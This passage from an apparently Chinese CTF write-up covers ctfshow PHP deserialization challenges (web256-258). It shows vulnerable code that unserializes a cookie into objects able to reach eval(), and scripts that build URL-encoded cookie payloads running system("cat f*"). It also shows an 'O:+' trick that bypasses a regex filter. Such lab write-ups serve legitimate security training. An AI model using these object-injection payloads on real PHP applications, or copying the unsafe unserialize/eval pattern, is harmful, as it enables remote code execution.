punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'yn8rt'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"yn8rt"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"isVip"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//urlç¼–ç å¤„ç†åï¼š</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A2</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bb<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web257â€”â€”å¯¹è±¡æ³¨å…¥"><a href="#web257â€”â€”å¯¹è±¡æ³¨å…¥" class="headerlink" title="web257â€”â€”å¯¹è±¡æ³¨å…¥"></a>web257â€”â€”å¯¹è±¡æ³¨å…¥</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤é¢˜å…³é”®ä¹‹å¤„åœ¨äº__destruct()åœ¨é”€æ¯å¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨getInfo()æ–¹æ³•ï¼Œè€Œè¿™æ—¶å€™çš„getInfo()æ–¹æ³•æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªåœ¨ç±»infoä¸­ã€‚ä¸€ä¸ªåœ¨backDoorä¸­ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯åˆ©ç”¨ååºåˆ—æ¥å°†åè€…çš„è¢«è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡éœ€è¦çš„æ˜¯backDoorçš„å±æ€§æ‰€ä»¥éœ€è¦å°†$this-&gt;classæŒ‡å‘backDoor</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">'system("cat f*");'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token string">"%00ctfShowUser%00class"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"backDoor"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"backDoorcode"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"system("</span>cat f<span class="token operator">*</span><span class="token string">");"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">666</span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A18</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00ctfShowUser<span class="token operator">%</span>00class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A14</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00backDoor<span class="token operator">%</span>00code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤šäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š<code>/[oc]:\d+:/i</code>ã€‚æ„æ€æ˜¯è¿‡æ»¤è¿™ä¸¤ç§æƒ…å†µï¼š<code>o:æ•°å­—:</code>ä¸<code>c:æ•°å­—:</code><br>è¿™ç§æƒ…å†µæ˜¯ç”¨<code>+(åŠ å·)</code>ç»•è¿‡çš„ï¼Œå¦‚ï¼š<code>o:+</code></p><p><strong>æ„é€ ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">'system("cat f*");'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'O:'</span><span class="token punctuation">,</span><span class="token string">'O:+'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//è¿è¡Œç»“æœ</span>O<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"class"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"backDoor"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"code"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"system("</span>cat f<span class="token operator">*</span><span class="token string">");"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//URLå¤„ç†</span>O<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">666</span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22code<span class="token operator">%</span><span class="token 